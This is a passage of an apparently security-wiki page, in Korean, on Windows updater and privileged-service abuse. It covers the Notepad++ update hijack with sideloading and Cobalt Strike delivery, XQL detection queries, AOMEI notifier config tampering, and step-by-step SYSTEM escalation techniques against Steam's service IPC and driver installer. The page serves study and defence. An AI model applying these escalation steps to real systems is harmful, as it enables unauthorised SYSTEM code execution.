2025년 6월부터 2025년 12월까지, Notepad++ 업데이트 흐름의 기반 호스팅 인프라를 침해한 공격자들은 특정 피해자에게 악성 manifest를 선별적으로 제공했습니다. 구형 WinGUp 기반 updater는 업데이트의 진위를 완전히 검증하지 않아 악성 XML 응답으로 클라이언트를 공격자가 제어하는 URL로 리디렉션할 수 있었습니다. 클라이언트가 신뢰할 수 있는 인증서 체인과 다운로드한 installer의 유효한 PE 서명을 모두 확인하지 않은 채 HTTPS 콘텐츠를 수락했기 때문에, 피해자는 트로이 목마화된 NSIS `update.exe`를 다운로드하고 실행했습니다.<sup>[[12]](#references)[[13]](#references)</sup>

운영 흐름(로컬 exploit 불필요):
1. **인프라 가로채기**: CDN/호스팅을 침해하고 업데이트 확인 요청에 공격자 메타데이터로 응답해 악성 다운로드 URL을 지정합니다.
2. **트로이 목마화된 NSIS**: installer가 payload를 가져와 실행하고 두 가지 실행 체인을 악용합니다.
   - **서명된 바이너리 가져와 사용 + sideload**: 서명된 Bitdefender `BluetoothService.exe`를 함께 배포하고 검색 경로에 악성 `log.dll`을 저장합니다. 서명된 바이너리가 실행되면 Windows가 `log.dll`을 sideload하고, 이 DLL은 Chrysalis 백도어를 복호화한 뒤 reflectively load합니다(정적 탐지를 방해하기 위해 Warbird 보호 및 API hashing 적용).
   - **스크립트 기반 shellcode injection**: NSIS가 Win32 API(예: `EnumWindowStationsW`)를 사용해 shellcode를 삽입하고 Cobalt Strike Beacon을 준비하는 컴파일된 Lua 스크립트를 실행합니다.<sup>[[12]](#references)</sup>

모든 auto-updater에 적용할 hardening/detection 참고 사항:
- 다운로드한 installer의 **인증서 + 서명 검증**을 강제하세요(공급업체 서명자를 pin하고, CN/체인이 일치하지 않으면 거부). 업데이트 manifest 자체에도 서명하세요(예: XMLDSig). 검증되지 않은 manifest 기반 리디렉션은 차단하세요.
- **BYO 서명 바이너리 sideloading**을 다운로드 후 탐지의 pivot으로 삼으세요. 서명된 공급업체 EXE가 정식 설치 경로 밖에 있는 DLL 이름을 로드할 때(예: Bitdefender가 Temp/Downloads의 `log.dll`을 로드하는 경우), 그리고 updater가 공급업체 서명이 없는 installer를 임시 경로에 저장하거나 실행할 때 경고를 발생시키세요.
- 이 공격 체인에서 관찰된 **악성코드별 아티팩트**를 모니터링하세요(일반적인 pivot으로도 유용함): mutex `Global\Jdhfv_1.0.1`, `%TEMP%`에 대한 비정상적인 `gup.exe` 쓰기, Lua 기반 shellcode injection 단계.
- Notepad++는 v8.8.9 및 이후 버전에서 WinGUp을 강화했습니다. 반환되는 XML에 이제 서명이 적용되며(XMLDSig), 최신 빌드는 전송 계층만 신뢰하는 대신 다운로드한 installer의 인증서 + 서명 검증을 강제합니다.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender 서명 EXE의 <code>log.dll</code> sideloading (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code>가 Notepad++가 아닌 설치 프로그램을 실행하는 경우</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

이러한 패턴은 서명되지 않은 manifest를 허용하거나 installer 서명자를 고정하지 않는 모든 updater에 적용됩니다. network hijack + malicious installer + BYO-signed sideloading은 “trusted” update라는 명목으로 remote code execution을 초래합니다.

### 두 번째 update 트리거로서의 notification 구성

updater는 별도의 remote 구성으로 **content를 준비하고 실행을 트리거**할 수 있습니다. 이를 위해서는 구성 또는 응답을 제어해야 합니다. 보고서에는 origin에 대한 접근 권한을 어떻게 얻었는지 나와 있지 않습니다. AOMEI 사례에서 `down_html.ini`는 archive URL, version(`thrid`), MD5(`Val`)를 지정했습니다. 공격자는 version을 높이고 URL과 이에 맞는 checksum을 함께 변경했습니다. 이는 위에서 설명한 [metadata trust-boundary failure](#2-hijacking-the-update-channel-to-run-code-as-system)입니다. 추가 실행 경로는 `Notifycfg.ini`였습니다. 이 파일은 `ABNotify.exe`가 WebView에서 로컬 `file:///` URL을 통해 압축 해제된 `upgrade-now.html`을 로드하도록 지정했습니다. 해당 페이지는 자동으로 같은 디렉터리의 실행 파일로 이동했고, WebView는 이를 system shell에 전달했습니다. 자식 프로세스는 notifier의 권한을 상속했습니다. 이 동작 자체가 권한을 SYSTEM으로 올리는 것은 아닙니다.<sup>[[17]](#references)[[18]](#references)</sup>

Google은 클라이언트의 일반적인 version gate를 우회한, 35,000개가 넘는 반복된 더미 section이 포함된 변조된 `Notifycfg.ini`도 보고했습니다. 이 보고서는 일반적인 parser bypass가 가능하다고 입증하지는 않습니다. 공격자는 5~10분 동안 remote 파일을 변경한 뒤 원래대로 복구했습니다. 따라서 해당 시간대에 polling한 클라이언트만 변경된 구성을 받았습니다. 이 notification channel에는 archive 실행이 필요하지 않은 별도의 [WebDAV/NTLM coercion lure](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion)도 포함되어 있었습니다.<sup>[[18]](#references)</sup>

---
## Shared-memory를 통한 privileged service IPC 부트스트랩

named-pipe 열거에서 멈추지 마세요. SYSTEM broker는 연결 설정에 권한이 느슨한 named **file mapping**을 노출한 다음, 요청 프로세스에 anonymous pipe handle을 복제할 수 있습니다. Steam의 테스트된 설계에서는 `Global\SteamClientService_SharedMemFile`과 `Global\SteamClientService_SharedMemLock`이 client PID/event handshake를 조정합니다. service는 pipe handle 두 개를 반환하며, 이후 length-prefixed request에는 `RunInterface`(`0x01`)를 사용합니다. mapping DACL은 모든 integrity level의 client를 허용했습니다. `steamclient64.dll`의 내부 `CSteamServiceWin32` object는 실용적인 client를 제공했습니다. 빌드별 global을 확인하고, vtable slot 0의 `Connect`를 호출한 다음, handshake를 재구현하는 대신 interface map을 사용하면 됩니다. IPC에 도달하는 것은 전제 조건일 뿐입니다. 권한이 높은 handler의 신뢰 결정에 따라 권한 상승 여부가 결정됩니다. <sup>[[19]](#references)[[20]](#references)</sup>

### 서명된 manifest가 오래된 executable allowlist로 확장됨

`IClientInstallUtils::AddInstallScriptToWhiteList`(slot 21)는 서명된 VDF의 `kvsignatures`를 확인하지만, 불변 file identity가 아니라 **확장된 executable pathname**을 기록합니다. `%INSTALLDIR%\Binaries\Prerequisites\vcredist_x86_vs2008sp1.exe` 같은 서명된 `Run Process` entry에 대해 사용자가 쓸 수 있는 `%INSTALLDIR%`를 지정합니다. 정확히 해당 확장 경로에 대체 executable을 넣은 다음, allowlist에 추가된 경로를 `Process 1`에 지정한 서명되지 않은 VDF로 `RunInstallScript`(slot 22)를 호출합니다. 해당 entry는 service가 재시작될 때까지 서명된 script 실행 후에도 남습니다. 보고된 구현에서는 SYSTEM으로 실행하기 전에 파일을 다시 검증하지 않습니다. 심어 둔 파일명은 prerequisite category만이 아니라 실제 서명된 entry와 일치시켜야 합니다. <sup>[[19]](#references)[[20]](#references)</sup>

### module-manager 자식 프로세스가 직접 로드 서명 검사를 우회함

`IClientModuleManager::LoadModule`(slot 0)은 제공된 ID가 module의 CRC32와 일치하면 module bytes를 허용합니다. `flags & 8`을 사용한 `CallFunctionAsync`(slot 3)는 Valve 서명을 확인하는 직접 reflective-load 경로 대신 **자식 프로세스** 경로를 선택합니다. service는 설치 디렉터리에서 `legacycompat\servicecall_<CRC>.dll`을 기록하고 `legacycompat\steamservice.exe /runfunc ...`를 실행합니다. 해당 디렉터리에 사용자가 쓸 수 있다면, 후자의 경로에 executable을 넣고 CRC가 일치하는 임시 module을 로드한 뒤 bit 3을 설정해 async method를 호출합니다. 보고된 빌드에서는 자식 executable과 디스크에 기록된 DLL을 인증하지 않았습니다. module 자체가 작동하는 payload일 필요는 없습니다. 대체한 자식 executable이 SYSTEM으로 실행됩니다. <sup>[[19]](#references)[[20]](#references)</sup>

### 권한이 높은 driver 설치 전 catalog-member 검사

driver-install broker의 경우 catalog 검증이 **installer에 전달된 정확한 INF**와 연결되는지 확인하세요. 보고된 `InstallVrLinkDongleDriver` 경로에서는 `WinVerifyTrust`가 catalog를 검증하고 `CryptCATAdminCalcHashFromFileHandle`이 caller가 지정한 디렉터리에서 일치하는 파일을 *하나 이상* 찾습니다. 그러나 service는 이 INF가 의도된 catalog member인지 확인하지 않고 `pnputil /add-driver ... /install`을 `netrtwlanuval.inf`에 실행합니다. 평면 디렉터리나 architecture별 디렉터리도 허용됩니다. 따라서 일치하는 파일이 디렉터리에 하나라도 포함된 서명된 catalog는, 권한이 높은 installer에 전달되는 INF가 달라도 취약한 service 검사를 통과할 수 있습니다. 이것만으로 Windows driver-signing policy를 우회할 수 있다고 단정하지 마세요. 설치 성공 여부는 대체 package와 host policy에 따라 달라집니다. <sup>[[19]](#references)[[20]](#references)</sup>

service는 `pnputil`이 INF를 열기 전에 검증 handle을 해제하므로, executable update가 아닌 driver-installation sink에서 [TOCTOU gap](#1-toctou-inside-updater-copyexecute-paths-msi-center-cmd_autoupdatesdk)이 발생합니다. oplock을 사용하면 검사와 installer가 파일을 여는 사이에 교체할 수 있습니다. 동일한 IPC는 별도의 consent 전제 조건하에 [secure-desktop input forwarding](../authentication-credentials-uac-and-efs/uac-user-account-control.md#secure-desktop-input-forwarded-through-a-writable-shared-memory-ring)도 노출합니다. <sup>[[19]](#references)</sup>

## References
- [1] [권고 – Windows용 Netskope Client – 악성 서버를 통한 로컬 권한 상승 (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope 보안 권고 NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre 및 Razer Synapse 4 해킹](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent의 쓰기 가능한 파일을 통한 로컬 권한 상승](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent의 권한 상승](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoC](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – 국가 지원 공격자의 Notepad++ 공급망 악용](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – 하이재킹된 인프라 사고 업데이트](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Windows용 Netskope Client의 CVE-2025-0309 수정 우회](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage의 권한 상승 취약점 발견](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: gRPC에서 SYSTEM까지](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – AOMEI Backupper 공급망 침해](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group 및 Mandiant – 일시적인 공급망 변조 조사](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
- [19] [Atredis – Valve 해킹](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [20] [Atredis – Turning the Valve PoC](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
